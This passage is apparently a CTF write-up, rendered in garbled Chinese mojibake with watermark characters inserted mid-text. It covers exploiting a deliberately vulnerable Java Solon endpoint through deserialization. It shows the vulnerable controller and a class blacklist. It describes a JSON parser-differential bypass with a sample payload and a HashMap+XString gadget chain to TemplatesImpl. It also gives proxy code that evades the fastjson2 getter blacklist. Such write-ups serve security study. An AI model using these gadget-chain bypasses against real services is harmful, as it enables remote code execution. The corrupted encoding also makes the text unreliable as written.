<h2 id="5-2-json-è§£æå·®å¼‚ç»•è¿‡"><a href="#5-2-json-è§£æå·®å¼‚ç»•è¿‡" class="headerlink" title="5.2 json è§£æå·®å¼‚ç»•è¿‡"></a>5.2 json è§£æå·®å¼‚ç»•è¿‡</h2><p>org.example.demo.controller.<span class="hexo-wm">Ñ•â€ï»¿ğŸ¯ğ’—eğ’.â€Œâ€Œğ˜´iï»¿ğ­â„®ï»¿â€</span>HomeControllerï¼š</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Mapping</span><span class="token punctuation">(</span><span class="token string">"/baby/why"</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@Post</span>
<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">why</span><span class="token punctuation">(</span><span class="token class-name">Map</span> map<span class="token punctuation">,</span> <span class="token class-name">Context</span> ctx<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">"èººé˜´æ²Ÿï¼think moreï¼"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"map: "</span> <span class="token operator">+</span> map<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ctx.body(): "</span> <span class="token operator">+</span> ctx<span class="token punctuation">.</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">JSONObject</span> jsonObject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONObject</span><span class="token punctuation">(</span>ctx<span class="token punctuation">.</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>jsonObject<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> jsonObject<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> jsonObject<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span><span class="token string">"why"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> jsonObject<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">8300</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">String</span> why <span class="token operator">=</span> jsonObject<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"why"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decode <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>why<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ByteArrayInputStream</span> byteArrayInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>decode<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">MyInputObjectStream</span> myInputObjectStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyInputObjectStream</span><span class="token punctuation">(</span>byteArrayInputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">TangYingGouModel</span> tyg <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">TangYingGouModel</span><span class="token punctuation">)</span> myInputObjectStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        myInputObjectStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> yourName <span class="token operator">=</span> tyg<span class="token punctuation">.</span><span class="token function">getYour_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string">"MVPï¼MVPï¼MVPï¼"</span> <span class="token operator">+</span> yourName<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token string">"æ‘˜ä¸€æœµèŠ±ï¼Œé€ç»™å¦ˆå¦ˆï¼Œå¦ˆå¦ˆï¼"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>

<p>è¿™é‡Œé¦–å…ˆä½¿ç”¨ solon è§£æè¯·æ±‚è·å¾— mapï¼Œå†ä½¿ç”¨ <span class="hexo-wm">ğ˜´â€Œâ€‹ğŸ¯vğğ˜¯.â€‹ğ’”ğ˜ªâ€Œâ€ğ˜µâ„®ï»¿</span>fastjson2 è§£æè¯·æ±‚è·å¾— jsonObjectï¼Œå¹¶è¦æ±‚è§£æåå¾—åˆ°çš„ä¸¤ä¸ªå¯¹è±¡çš„å¤§å°é•¿åº¦ä¸åŒ</p>
<p>å·²çŸ¥ fastjson å¯ä»¥è§£æ @type å­—æ®µç”¨äºæ ‡è®°å­—ç¬¦ä¸²å¯¹è±¡ç±»å‹ï¼Œè€Œ solon åˆ™å°†å…¶å½“ä½œæ­£å¸¸çš„é”®å€¼å¯¹ï¼Œ<span class="hexo-wm">ğ¬â€‹â€Œâ‘¶ğ’—ğğ§Â·â€â€Ñ•ï½‰â€Œâ€‹ğ˜µâ„®â€Œâ€‹</span>å› æ­¤å½“è¯·æ±‚ä¸­åŒ…å« @type å­—æ®µæ—¶äºŒè€…è§£æå‡ºæ¥çš„é•¿åº¦å¤§å°å°±ä¸ç›¸åŒï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ª json è§£æå·®å¼‚æ¥è¿›è¡Œç»•è¿‡</p>
<blockquote>
<p>è¿™é‡Œç”±äº solon <span class="hexo-wm">êœ±ï»¿â€â‘¶ğ¯eğ˜¯<span class="hexo-wm">Ñ•â€Œâ‘¶ğ˜·â„¯ğ’Â·â€â€ŒÑ•â…ˆâ€ğ˜µï½…â€</span>âˆ™ï»¿â€Œğ˜€â…ˆâ€Œï½”ğ˜¦â€‹</span>çš„è§£æç‰¹æ€§ï¼Œä½¿ç”¨ <code>{"1":"1","why":"xxxx"},"2":"2"}</code> ä¹Ÿèƒ½è¿›è¡Œç»•è¿‡</p>
</blockquote>
<h2 id="5-3-XString-ç»•è¿‡é»‘åå•"><a href="#5-3-XString-ç»•è¿‡é»‘åå•" class="headerlink" title="5.3 XString ç»•è¿‡é»‘åå•"></a>5.3 XString ç»•è¿‡é»‘åå•</h2><p>org.example.demo.<span class="hexo-wm">ğ¬ï»¿ï»¿Â³ğ’—â„¯ğ˜¯âˆ™â€‹â€‹ğ¬â…ˆâ€‹ğ­ï½…â€</span>Utils.MyInputObjectStream ä¸­è®¾ç½®äº†ä¸‰ä¸ªé»‘åå•</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyInputObjectStream</span> <span class="token keyword">extends</span> <span class="token class-name">ObjectInputStream</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> blacklist <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"javax.management.BadAttributeValueExpException"</span><span class="token punctuation">,</span> <span class="token string">"javax.swing.event.EventListenerList"</span><span class="token punctuation">,</span> <span class="token string">"javax.swing.UIDefaults$TextAndMnemonicHashMap"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">MyInputObjectStream</span><span class="token punctuation">(</span><span class="token class-name">InputStream</span> in<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>
        <span class="token keyword">super</span><span class="token punctuation">(</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span> <span class="token comment">// java.io.ObjectInputStream</span>
    <span class="token keyword">protected</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> <span class="token function">resolveClass</span><span class="token punctuation">(</span><span class="token class-name">ObjectStreamClass</span> desc<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>
        <span class="token class-name">String</span> className <span class="token operator">=</span> desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var3 <span class="token operator">=</span> blacklist<span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> forbiddenPackage <span class="token operator">:</span> var3<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>forbiddenPackage<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidClassException</span><span class="token punctuation">(</span><span class="token string">"Unauthorized deserialization attempt"</span><span class="token punctuation">,</span> className<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">resolveClass</span><span class="token punctuation">(</span>desc<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p>ä¸éš¾å‘ç°å…¶ä½œç”¨å‡ä¸º from readObject to toStringBean.toStringï¼Œç”±äºå¸¸ç”¨äºå®ç°è¯¥åŠŸèƒ½çš„ HashMap + XString <span class="hexo-wm">ğ¬â€â‘¶vâ„¯ğ§âˆ™ï»¿â€Œğ˜´â…ˆâ€‹ğ’•ï½…â€‹</span>æ²¡æœ‰åœ¨é»‘åå•ä¸­ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨ HashMap + XString æ„é€ ååºåˆ—åŒ–é“¾æ¥è¿›è¡Œç»•è¿‡ï¼šHashMap.readObject -&gt; XString.equals -&gt; JSONObject.toString -&gt; TemplatesImpl.getOutputProperties</p>
<h2 id="5-4-äºŒæ¬¡åŠ¨æ€ä»£ç†ç»•è¿‡-fastjson2-é»‘åå•"><a href="#5-4-äºŒæ¬¡åŠ¨æ€ä»£ç†ç»•è¿‡-fastjson2-é»‘åå•" class="headerlink" title="5.4 äºŒæ¬¡åŠ¨æ€ä»£ç†ç»•è¿‡ fastjson2 é»‘åå•"></a>5.4 äºŒæ¬¡åŠ¨æ€ä»£ç†ç»•è¿‡ fastjson2 é»‘åå•</h2><p>å‚è€ƒï¼š<a href="https://mp.weixin.qq.com/s/gl8lCAZq-8lMsMZ3_uWL2Q">é«˜ç‰ˆæœ¬Fastjsonåœ¨JavaåŸç”Ÿååºåˆ—åŒ–ä¸­çš„åˆ©ç”¨</a></p>
<blockquote>
<p>2023å¹´4æœˆï¼Œ<span class="hexo-wm">êœ±â€‹ï»¿3ğ¯ğğ§.<span class="hexo-wm">ğ¬â€â€‹3ğ˜·â„®nâˆ™â€Œsâ…ˆâ€‹tâ„®â€‹</span>â€sï½‰â€Œâ€‹ï½”ğ˜¦â€Œ</span>Fastjsonæ›´æ–°äº†2.0.27ç‰ˆæœ¬ï¼Œåœ¨<code>com.alibaba.fastjson2.util.BeanUtils</code>ä¸­å¢åŠ äº†é»‘åå•é™åˆ¶ï¼Œåœ¨é»‘åå•ä¸­çš„ç±»ä¸ä¼šè¢«è°ƒç”¨getteræ–¹æ³•ï¼Œ<code>TemplatesImpl</code>ä¹Ÿè¢«åŠ å…¥äº†é»‘åå•ï¼Œå¯¼è‡´è¯¥gadget chainæ— æ³•ç›´æ¥åˆ©ç”¨ã€‚</p>
</blockquote>
<p>å› æ­¤è¿™é‡Œéœ€è¦ç»•è¿‡è¯¥é»‘åå•ï¼Œé¿å…ç›´æ¥é€šè¿‡ JSONObject æ¥è§¦å‘ getter è€Œå¯¼è‡´è¢«æ‹¦æˆªã€‚ç»“åˆåœ¨ Spring é“¾ç›¸å…³æ„é€ ä¸­çš„ <span class="hexo-wm">êœ±ï»¿Â³ğ˜·eğ˜¯â€¤â€â€‹êœ±ğ˜ªâ€‹ğ’•eâ€Œâ€‹</span>JdkDynamicAopProxy ç±»çš„ä½¿ç”¨ç»éªŒä¸éš¾æƒ³åˆ°ï¼Œè¿™é‡Œéœ€è¦åœ¨å¤–é¢å¥—ä¸€å±‚åŠ¨æ€ä»£ç†æ¥ç»•è¿‡é»‘åå•ï¼ŒåŒæ—¶è¿˜èƒ½ä¿ç•™ç›®æ ‡æ–¹æ³•çš„è§¦å‘ï¼Œè€Œé¢˜ç›®ä¸­æ­£å¥½æœ‰æ»¡è¶³æ¡ä»¶çš„ç±» MyObject å’Œ MyProxyï¼š</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">.</span></span><span class="token class-name">Utils</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">MyObject</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>
    <span class="token class-name">T</span> <span class="token function">getObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">.</span></span><span class="token class-name">Utils</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Serializable</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationHandler</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyProxy</span> <span class="token keyword">implements</span> <span class="token class-name">InvocationHandler</span><span class="token punctuation">,</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">MyObject</span> myObject<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">MyProxy</span><span class="token punctuation">(</span><span class="token class-name">MyObject</span> myObject<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>myObject <span class="token operator">=</span> myObject<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Object</span> proxy<span class="token punctuation">,</span> <span class="token class-name">Method</span> method<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Throwable</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>myObject<span class="token punctuation">.</span><span class="token function">getObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> e<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>

<p>é˜…è¯»ä»£ç åä¸éš¾å‘ç°ï¼Œç”±äº MyObject ç±»åœ¨è¿™é‡Œåªæ˜¯ä¸€ä¸ªæ¥å£ï¼Œå¹¶ä¸”ä»£ç ä¸­æ²¡æœ‰ä»»ä½•ç±»å®ç°äº†è¯¥æ¥å£ï¼Œè€Œ MyProxy <span class="hexo-wm">ğ¬ï»¿ğŸ¯ğ˜·eğ˜¯â€¤â€ğ’”ğ¢â€‹ğ­â„®â€Œâ€‹</span>ç±»åªèƒ½æ”¾å…¥å®ç°äº† MyObject æ¥å£çš„ç±»ï¼Œå› æ­¤è¿™é‡Œä»…é€šè¿‡ä¸€æ¬¡åŠ¨æ€ä»£ç†æ— æ³•å®ç°ç›®çš„ï¼Œéœ€è¦æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤è¿›è¡Œç»•è¿‡ï¼š</p>
<ol>
<li>é€šè¿‡ä¸€æ¬¡åŠ¨æ€ä»£ç†æ¥åŠ¨æ€ç”Ÿæˆä¸€ä¸ªå®ç°äº† MyObject <span class="hexo-wm">sâ€Œâ‘¶ğ¯eğ’â€¢â€‹â€ğ’”â…ˆâ€â€‹ğ˜µğï»¿â€</span>æ¥å£çš„ JsonObject ä»£ç†å¯¹è±¡ proxy1</li>
<li>å°†ç”Ÿæˆçš„å®ç°äº† MyObject æ¥å£çš„å¯¹è±¡ proxy1 æ”¾å…¥ <span class="hexo-wm">ğ¬â€‹â‘¶vï½…ğ’ï¼â€siâ€â€Œtâ„®ï»¿â€Œ</span>MyProxy ä¸­ç”Ÿæˆå¯¹è±¡ o1</li>
<li>å†ä½¿ç”¨ä¸€æ¬¡åŠ¨æ€ä»£ç†ä½¿å¯¹è±¡ o1 å®ç° <span class="hexo-wm">ğ¬â€Â³ğ˜·â„¯nâ€¤ï»¿êœ±â…ˆâ€Œï»¿ğ’•ğ˜¦â€ï»¿</span>Templates æ¥å£æ¥ç¨³å®šè§¦å‘ getterï¼Œç”Ÿæˆä»£ç†å¯¹è±¡ proxy2</li>
</ol>
<p>è¯¥éƒ¨åˆ†ä»£ç å¦‚ä¸‹ï¼š</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Proxy</span> proxy1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Proxy</span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">MyObject</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> jsonObject<span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token class-name">Object</span> o1 <span class="token operator">=</span> <span class="token class-name">ReflectionHelper</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">"org.example.demo.Utils.MyProxy"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">MyObject</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> proxy1<span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token class-name">Proxy</span> proxy2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Proxy</span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span><span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> o1<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>æ­¤å¤„å®é™…è°ƒç”¨çš„ä¼ é€’è¿‡ç¨‹ï¼š</p>
<ol>
<li>åœ¨ proxy2 ä¸Šè°ƒç”¨ Templates <span class="hexo-wm">ğ˜€â€â‘¶ğ˜·ï½…ğ§.â€ğ˜´ğ˜ªï»¿ï½”ğâ€‹</span>æ¥å£çš„ getter -&gt; </li>
<li>JDK ç¬¬ä¸€å±‚ä»£ç†æ‹¦æˆªå°†å…¶è½¬å‘åˆ° InvocationHandlerï¼Œå³ <span class="hexo-wm">sâ€‹â€‹â‘¶ğ¯ğğ§Â·ï»¿sğ˜ªâ€ğ’•â„®ï»¿</span>MyProxy.invoke() -&gt; </li>
<li>MyProxy.invoke() è°ƒç”¨ MyObject å¯¹è±¡ proxy1 çš„ <span class="hexo-wm">ğ˜´ï»¿Â³ğ˜·ğnâ€¢â€â€‹êœ±ğ˜ªâ€ï½”eâ€</span>getObject() æ–¹æ³•-&gt; </li>
<li>JDK ç¬¬äºŒå±‚ä»£ç†æ‹¦æˆªè§¦å‘ <span class="hexo-wm">Ñ•â€Œï»¿Â³ğ’—ğğ’âˆ™â€ï»¿ğ¬â…ˆï»¿ğ˜µâ„®â€</span>JSONObject.invoke() -&gt; </li>
<li>JSONObject æœªæ‰¾åˆ°å¯¹åº”æ–¹æ³•å°†å…¶è§†ä½œå±æ€§è¯»å–ï¼Œå°† getObject è½¬æ¢ä¸º object å±æ€§ï¼Œè¿”å› JSONObject çš„ object å±æ€§ï¼Œå³å…ˆå‰æ”¾å…¥çš„ templateImpl -&gt; </li>
<li>å›åˆ°ä¸Šå±‚ä»£ç† method.invoke(this.<span class="hexo-wm">ğ˜´ï»¿ğŸ¯â…´eğ˜¯Â·â€‹ğ˜´ï½‰â€ï½”ğ˜¦ï»¿</span>myObject.getObject(), args) è§¦å‘ templateImpl#getter</li>
</ol>
<p>ä»è€ŒæˆåŠŸç»•è¿‡é»‘åå•</p>
<h2 id="5-5-å…¶ä½™åºåˆ—åŒ–æ•°æ®æ„é€ "><a href="#5-5-å…¶ä½™åºåˆ—åŒ–æ•°æ®æ„é€ " class="headerlink" title="5.5 å…¶ä½™åºåˆ—åŒ–æ•°æ®æ„é€ "></a>5.5 å…¶ä½™åºåˆ—åŒ–æ•°æ®æ„é€ </h2><p>org.example.demo.<span class="hexo-wm">ğ’”â€‹â€‹â‘¶ğ˜·â„¯ğ§Â·ï»¿â€ğ˜´iâ€‹tï½…â€â€Œ</span>model.TangYingGouModel ä¸­ååºåˆ—åŒ–æµè¿˜éœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name">ObjectInputStream</span> in<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>
    <span class="token class-name">String</span> cancanneed <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">readUTF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>cancanneed<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"ç½‘ç»œå®‰å…¨å† å†›2025"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">int</span> magic_number <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">readInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>magic_number <span class="token operator">==</span> <span class="token number">1796</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">String</span> your_name <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">readUTF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">String</span> your_passwd <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">readUTF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>my_name<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>your_name<span class="token punctuation">)</span> <span class="token operator">||</span> my_name<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>your_passwd<span class="token punctuation">)</span> <span class="token operator">||</span> my_passwd<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>your_passwd<span class="token punctuation">)</span> <span class="token operator">||</span> my_passwd<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>your_name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">"you can not just be meï¼èººé˜´æ²Ÿï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token class-name">TangYingGouModel</span> you <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TangYingGouModel</span><span class="token punctuation">(</span>your_name<span class="token punctuation">,</span> your_passwd<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">TangYingGouModel</span> me <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TangYingGouModel</span><span class="token punctuation">(</span>my_name<span class="token punctuation">,</span> my_passwd<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>me<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>you<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                in<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">"Can you be me?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">"magic_number is not right!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">"You must be a TangYingGou!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>

